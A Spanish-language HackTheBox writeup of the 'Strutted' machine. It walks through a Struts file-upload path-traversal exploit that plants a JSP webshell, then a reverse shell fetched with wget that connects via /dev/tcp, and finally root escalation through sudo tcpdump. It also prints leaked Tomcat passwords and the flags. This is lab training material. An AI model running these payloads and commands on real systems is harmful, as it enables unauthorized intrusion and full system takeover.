---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Strutted HackTheBox (Intermediate)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-02 05:20 EDT
Nmap scan report for 10.10.11.59
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.33 seconds
```

Veremos varios puertos interesantes entre ellos el puerto `80` que aloja una pagina web la cual vemos que nos esta redirigiendo a un dominio llamado `strutted.htb`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>            strutted.htb
```

Lo guardamos y entramos en dicho dominio, entrando veremos una pagina web normal y corriente, nada fuera de lo normal, pero si le damos al boton `Download` veremos que se nos descarga un archivo `.zip`, si lo descomprimimos veremos lo siguiente:

```shell
unzip strutted.zip
```

Info:

```
Archive:  strutted.zip
  inflating: Dockerfile              
  inflating: README.md               
  inflating: context.xml             
   creating: strutted/
  inflating: strutted/pom.xml        
  inflating: strutted/mvnw.cmd       
  inflating: strutted/mvnw           
   creating: strutted/src/
   creating: strutted/src/main/
   creating: strutted/src/main/webapp/
   creating: strutted/src/main/webapp/WEB-INF/
  inflating: strutted/src/main/webapp/WEB-INF/error.jsp  
  inflating: strutted/src/main/webapp/WEB-INF/web.xml  
  inflating: strutted/src/main/webapp/WEB-INF/showImage.jsp  
  inflating: strutted/src/main/webapp/WEB-INF/upload.jsp  
  inflating: strutted/src/main/webapp/WEB-INF/how.jsp  
  inflating: strutted/src/main/webapp/WEB-INF/about.jsp  
  inflating: strutted/src/main/webapp/WEB-INF/success.jsp  
   creating: strutted/src/main/java/
   creating: strutted/src/main/java/org/
   creating: strutted/src/main/java/org/strutted/
   creating: strutted/src/main/java/org/strutted/htb/
  inflating: strutted/src/main/java/org/strutted/htb/Upload.java  
  inflating: strutted/src/main/java/org/strutted/htb/URLMapping.java  
  inflating: strutted/src/main/java/org/strutted/htb/AboutAction.java  
  inflating: strutted/src/main/java/org/strutted/htb/DatabaseUtil.java  
  inflating: strutted/src/main/java/org/strutted/htb/HowAction.java  
  inflating: strutted/src/main/java/org/strutted/htb/URLUtil.java  
   creating: strutted/src/main/resources/
  inflating: strutted/src/main/resources/struts.xml  
   creating: strutted/target/
   creating: strutted/target/generated-sources/
   creating: strutted/target/generated-sources/annotations/
   creating: strutted/target/strutted-1.0.0/
   creating: strutted/target/strutted-1.0.0/META-INF/
   creating: strutted/target/strutted-1.0.0/WEB-INF/
  inflating: strutted/target/strutted-1.0.0/WEB-INF/error.jsp  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/web.xml  
   creating: strutted/target/strutted-1.0.0/WEB-INF/lib/
  inflating: strutted/target/strutted-1.0.0/WEB-INF/lib/javassist-3.29.0-GA.jar  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/lib/sqlite-jdbc-3.47.1.0.jar  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/lib/commons-lang3-3.13.0.jar  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/lib/ognl-3.3.4.jar  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/lib/javax.servlet-api-4.0.1.jar  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/lib/commons-fileupload-1.5.jar  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/lib/commons-text-1.10.0.jar  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/lib/log4j-api-2.20.0.jar  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/lib/struts2-core-6.3.0.1.jar  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/lib/freemarker-2.3.32.jar  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/lib/commons-io-2.13.0.jar  
   creating: strutted/target/strutted-1.0.0/WEB-INF/classes/
  inflating: strutted/target/strutted-1.0.0/WEB-INF/classes/struts.xml  
   creating: strutted/target/strutted-1.0.0/WEB-INF/classes/org/
   creating: strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/
   creating: strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/
  inflating: strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/AboutAction.class  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/URLMapping.class  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/URLUtil.class  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/Upload.class  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/DatabaseUtil.class  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/classes/org/strutted/htb/HowAction.class  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/upload.jsp  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/how.jsp  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/about.jsp  
  inflating: strutted/target/strutted-1.0.0/WEB-INF/success.jsp  
   creating: strutted/target/classes/
  inflating: strutted/target/classes/struts.xml  
   creating: strutted/target/classes/org/
   creating: strutted/target/classes/org/strutted/
   creating: strutted/target/classes/org/strutted/htb/
  inflating: strutted/target/classes/org/strutted/htb/AboutAction.class  
  inflating: strutted/target/classes/org/strutted/htb/URLMapping.class  
  inflating: strutted/target/classes/org/strutted/htb/URLUtil.class  
  inflating: strutted/target/classes/org/strutted/htb/Upload.class  
  inflating: strutted/target/classes/org/strutted/htb/DatabaseUtil.class  
  inflating: strutted/target/classes/org/strutted/htb/HowAction.class  
   creating: strutted/target/maven-archiver/
 extracting: strutted/target/maven-archiver/pom.properties  
  inflating: strutted/target/strutted-1.0.0.war  
   creating: strutted/target/maven-status/
   creating: strutted/target/maven-status/maven-compiler-plugin/
   creating: strutted/target/maven-status/maven-compiler-plugin/compile/
   creating: strutted/target/maven-status/maven-compiler-plugin/compile/default-compile/
  inflating: strutted/target/maven-status/maven-compiler-plugin/compile/default-compile/createdFiles.lst  
  inflating: strutted/target/maven-status/maven-compiler-plugin/compile/default-compile/inputFiles.lst  
  inflating: tomcat-users.xml
```

Veremos que es como una especie de `backup` de la propia pagina web, por lo que vamos a investigar a ver que vemos.

Si leemos el archivo `tomcat-users.xml` veremos lo siguiente:

```xml
<?xml version='1.0' encoding='utf-8'?>

<tomcat-users>
    <role rolename="manager-gui"/>
    <role rolename="admin-gui"/>
    <user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/>
</tomcat-users>
```

Veremos que hay unas credenciales de `administrador` del propio tomcat del `manager`, pero si intentamos acceder veremos que no nos deja al `manager` da un error en la `URL` por lo que lo puede tener desactivado.

Tambien si leemos el `pom.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <packaging>war</packaging>

    <artifactId>strutted</artifactId>
    <groupId>org.strutted.htb</groupId>
    <version>1.0.0</version>

    <name>Strutted™</name>
    <description>Instantly upload an image and receive a unique, shareable link. Keep your images secure, accessible, and easy to share—anywhere, anytime.</description>

    <properties>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <maven.compiler.source>17</maven.compiler.source>
        <maven.compiler.target>17</maven.compiler.target>
        <struts2.version>6.3.0.1</struts2.version>
        <jetty-plugin.version>9.4.46.v20220331</jetty-plugin.version>
        <maven.javadoc.skip>true</maven.javadoc.skip>
        <jackson.version>2.14.1</jackson.version>
        <jackson-data-bind.version>2.14.1</jackson-data-bind.version>
    </properties>

    <dependencyManagement>
        <dependencies>
            <dependency>
                <groupId>javax.servlet</groupId>
                <artifactId>javax.servlet-api</artifactId>
                <version>4.0.1</version>
                <scope>compile</scope>
            </dependency>

            <dependency>
                <groupId>org.apache.struts</groupId>
                <artifactId>struts2-core</artifactId>
                <version>${struts2.version}</version>
            </dependency>

            <dependency>
                <groupId>org.apache.struts</groupId>
                <artifactId>struts2-config-browser-plugin</artifactId>
                <version>${struts2.version}</version>
            </dependency>

            <dependency>
                <groupId>com.fasterxml.jackson.core</groupId>
                <artifactId>jackson-databind</artifactId>
                <version>${jackson-data-bind.version}</version>
            </dependency>
            <dependency>
                <groupId>com.fasterxml.jackson.dataformat</groupId>
                <artifactId>jackson-dataformat-xml</artifactId>
                <version>${jackson.version}</version>
            </dependency>


        </dependencies>
    </dependencyManagement>

    <dependencies>
        <dependency>
            <groupId>org.apache.struts</groupId>
            <artifactId>struts2-core</artifactId>
        </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>javax.servlet-api</artifactId>
        </dependency>
        <dependency>
          <groupId>org.xerial</groupId>
          <artifactId>sqlite-jdbc</artifactId>
          <version>3.47.1.0</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.eclipse.jetty</groupId>
                <artifactId>jetty-maven-plugin</artifactId>
                <version>${jetty-plugin.version}</version>
                <configuration>
                    <webApp>
                        <contextPath>/${project.artifactId}</contextPath>
                    </webApp>
                    <stopKey>CTRL+C</stopKey>
                    <stopPort>8999</stopPort>
                    <httpConnector>
                        <port>9999</port>
                    </httpConnector>
                    <scanIntervalSeconds>10</scanIntervalSeconds>
                </configuration>
            </plugin>
        </plugins>

        <pluginManagement>
            <plugins>
                <plugin>
                    <groupId>org.apache.maven.plugins</groupId>
                    <artifactId>maven-war-plugin</artifactId>
                    <version>3.4.0</version>
                </plugin>
            </plugins>
        </pluginManagement>

    </build>
</project>
```

Veremos algo bastante interesante entre estas dos cosas, vemos que el `software` de `Struts` es vulnerable por la version conocida como `6.3.0.1` que vemos en el `pom.xml`, si buscamos informacion veremos que en este repositorio esta el `PoC`.

URL = [Exploit Upload File CVE-2024-53677](https://github.com/Trackflaw/CVE-2023-50164-ApacheStruts2-Docker/tree/main)

Por lo que vemos nos da unas instrucciones de como se debe subir un archivo y modificarlo añadiendo el siguiente `payload`:

```
-----------------------------<NUMBERS>
Content-Disposition: form-data; name="top.uploadFileName"

../../webshell.jsp
-----------------------------<NUMBERS>--
```

Lo que tenemos que hacer es descargarnos una imagen real, despues la vamos a subir en la pagina donde pone `upload`, pero antes de subirla abriremos `BurpSuite` y capturaremos la peticion poniendonos en mitad de la escucha:

Una vez capturada tendremos que cambiar la peticion algo asi:

```
POST /upload.action HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------265904619834939401522208686854
Content-Length: 4674
Origin: http://strutted.htb
Connection: keep-alive
Referer: http://strutted.htb/upload.action
Cookie: JSESSIONID=4BF9A5A9635E410E8ADDC01CEB19E451
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------265904619834939401522208686854

Content-Disposition: form-data; name="Upload"; filename="img.png"

Content-Type: image/png

PNG



<%@ page import="java.util.*,java.io.*"%>
<%
    //
    // JSP_KIT
    //
    // cmd.jsp = Command Execution (unix)
    //
    // by: Unknown
    // modified: 27/06/2003
    //
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
    if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while (disr != null) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
%>
</pre>
</BODY></HTML>
-----------------------------265904619834939401522208686854
Content-Disposition: form-data; name="top.UploadFileName"



../../webshell.jsp
-----------------------------265904619834939401522208686854--
```

VISTA GRAFICA:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-03 113504.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-03 113519.png" alt=""><figcaption></figcaption></figure>

Lo que hice fue eliminar la mitad del contenido de la imagen y añadir este contenido en `JSP` para ejecutar comandos a nivel del sistema, tambien super importante en el primer `upload` lo cambiamos por `Upload` con la `U` mayuscula (`name="Upload"`):

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
    //
    // JSP_KIT
    //
    // cmd.jsp = Command Execution (unix)
    //
    // by: Unknown
    // modified: 27/06/2003
    //
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
    if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while (disr != null) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
%>
</pre>
</BODY></HTML>
```

Despues añadir la cabecera del `payload` para que el archivo se deposite como `.jsp` y realizando un `path Traversal` para que este al principio de la pagina y podamos acceder.

> Response:

```
..............................<RESTO DE PETICION>..................................
   <div class="content-wrapper">
        <div class="hero-section">
            <div class="container">
                <h1>Image Upload Successful!</h1>
                <p>Congratulations! Your image has been securely uploaded and is now accessible via a shareable link.</p>
            </div>
        </div>
..............................<RESTO DE PETICION>..................................
```

Si vemos esta respuesta del servidor es que ha funcionado de forma correcta, por lo que si accedemos de esta forma:

```
URL = http://strutted.htb/cmd.jsp
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-03 113547.png" alt=""><figcaption></figcaption></figure>

Veremos que funciona este archivo que hemos inyectado a traves de la peticion, ahora vamos a establecer una `shell` hacia el servidor de esta forma:

> shell.sh

```bash
#!/bin/bash

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Vamos abrirnos un servidor de `python3` para que descargue el archivo desde la pagina y lo guarde en `/tmp`.

```shell
python3 -m http.server 80
```

Vamos a ponernos a la escucha de seguido:

```shell
nc -lvnp <PORT>
```

Ahora si ejecutamos estos comandos en la pagina:

```shell
wget http://<IP_ATTACKER>/shell.sh -O /tmp/shell.sh
chmod +x /tmp/shell.sh
/tmp/shell.sh
```

Si vamos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.64] from (UNKNOWN) [10.10.11.59] 54718
bash: cannot set terminal process group (1052): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@strutted:~$ whoami
whoami
tomcat
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user

Si probamos a reutilizar la contraseña de `tomcat-users.xml` que encontramos en el `backup` de antes de la pagina veremos que no funciona, pero vamos a leer el que esta dentro del servidor a ver si es igual.

```shell
cat /var/lib/tomcat9/conf/tomcat-users.xml
```

Info:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->
<!--
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
  <role rolename="manager-gui"/>
  <role rolename="admin-gui"/>
  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
--->
<!--
  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
</tomcat-users>
```

Vemos que es diferente y hay otra contraseña `IT14d6SSP81k`, si probamos con esta por `SSH`:

### SSH

```shell
ssh james@<IP>
```

Metemos como contraseña `IT14d6SSP81k`...

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Oct  3 09:50:22 AM UTC 2025

  System load:           0.38
  Usage of /:            79.6% of 5.81GB
  Memory usage:          37%
  Swap usage:            0%
  Processes:             217
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.59
  IPv6 address for eth0: dead:beef::250:56ff:fe94:112


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

5 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Jan 21 13:46:18 2025 from 10.10.14.64
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@strutted:~$ whoami
james
```

Veremos que ha funcionado, por lo que leeremos la `flag` del usuario.

> user.txt

```
34b5d0c1549cd5a7b5dcb304224a7e14
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

Vemos que podemos ejecutar el binario `tcpdump` como el usuario `root`, por lo que vamos hacer lo siguiente:

```shell
COMMAND='chmod u+s /bin/bash'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

Info:

```
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
```

Ahora si comprobamos si ha funcionado:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Veremos que funciono, por lo que haremos lo siguiente:

```shell
bash -p
```

Info:

```
bash-5.1# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
c7ca6cfdaccd72f9fe47bce0a9474a82
```
